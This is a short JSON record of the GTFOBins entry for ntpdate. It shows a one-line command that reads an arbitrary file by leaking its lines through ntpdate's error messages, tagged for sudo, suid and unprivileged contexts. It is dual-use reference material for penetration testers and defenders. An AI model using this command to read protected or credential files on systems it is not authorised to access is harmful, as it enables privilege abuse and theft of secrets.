{"title": "ntpdate", "source": "gtfobins", "source_label": "GTFOBins", "path": "ntpdate", "html": "<h1>ntpdate</h1>\n<h2>File Read</h2>\n<p>The file is actually parsed and lines are leaked through error messages.</p>\n<pre><code class=\"language-bash\">ntpdate -a x -k /path/to/input-file -d localhost</code></pre>", "excerpt": "ntpdate File Read The file is actually parsed and lines are leaked through error messages. ntpdate -a x -k /path/to/input-file -d localhost", "tags": ["func:file-read", "ctx:sudo", "ctx:suid", "ctx:unprivileged"]}